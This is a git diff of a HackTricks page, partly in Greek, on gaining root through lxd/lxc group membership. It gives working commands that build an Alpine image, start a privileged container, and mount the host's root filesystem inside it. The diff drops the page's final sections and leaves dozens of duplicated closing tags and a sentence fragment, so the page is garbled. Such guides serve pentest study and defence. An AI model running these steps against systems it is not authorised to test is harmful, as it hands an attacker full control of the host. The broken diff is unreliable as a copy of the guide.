@@ -1,26 +1,48 @@
-# lxd/lxc Ομάδα - Ανέβασμα προνομιακών δικαιωμάτων
+# lxd/lxc Group - Privilege escalation
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Εάν ανήκετε στην _**lxd**_ **ή** _**lxc**_ **ομάδα**, μπορείτε να γίνετε root
+Αν ανήκετε στην ομάδα _**lxd**_ **ή** _**lxc**_, μπορείτε να γίνετε root
 
-## Εκμεταλλευόμενοι χωρίς σύνδεση στο διαδίκτυο
+## Εκμετάλλευση χωρίς ίντερνετ
 
 ### Μέθοδος 1
 
-Μπορείτε να εγκαταστήσετε στη μηχανή σας αυτόν τον κατασκευαστή διανομής: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(ακολουθήστε τις οδηγίες του github):
+Μπορείτε να εγκαταστήσετε στον υπολογιστή σας αυτόν τον κατασκευαστή διανομών: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(ακολουθήστε τις οδηγίες του github):
 ```bash
 sudo su
 #Install requirements
@@ -38,7 +60,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-Μεταφορτώστε τα αρχεία **lxd.tar.xz** και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε έναν container:
+Ανεβάστε τα αρχεία **lxd.tar.xz** και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,11 +76,11 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-Αν αντιμετωπίσετε αυτό το σφάλμα _**Σφάλμα: Δεν βρέθηκε αποθηκευτική μονάδα. Παρακαλώ δημιουργήστε μια νέα αποθηκευτική μονάδα**_\
-Εκτελέστε **`lxd init`** και **επαναλάβετε** το προηγούμενο τμήμα εντολών
+Αν βρείτε αυτό το σφάλμα _**Σφάλμα: Δεν βρέθηκε πισίνα αποθήκευσης. Παρακαλώ δημιουργήστε μια νέα πισίνα αποθήκευσης**_\
+Τρέξτε **`lxd init`** και **επαναλάβετε** το προηγούμενο κομμάτι εντολών
 {% endhint %}
 
-Τελικά μπορείτε να εκτελέσετε τον container και να αποκτήσετε root:
+Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -66,7 +88,7 @@ lxc exec privesc /bin/sh
 ```
 ### Μέθοδος 2
 
-Δημιουργήστε ένα εικονικό περιβάλλον Alpine και ξεκινήστε το χρησιμοποιώντας τη σημαία `security.privileged=true`, εξαναγκάζοντας τον ελάχιστο χώρο να αλληλεπιδράσει ως root με το αρχείοσύστημα του κεντρικού συστήματος.
+Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας την επιλογή `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του host.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -86,37 +108,65 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-# interact with the container
-lxc start mycontainer
-lxc exec mycontainer /bin/sh
-```
-Εναλλακτικά [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
-
-## Με σύνδεση στο διαδίκτυο
-
-Μπορείτε να ακολουθήσετε [αυτές τις οδηγίες](https://reboare.github.io/lxd/lxd-escape.html).
-```bash
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test bash
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
-```
-## Αναφορές
-
-* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
-* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+{% endhint %}
+</details>
+{% endhint %}
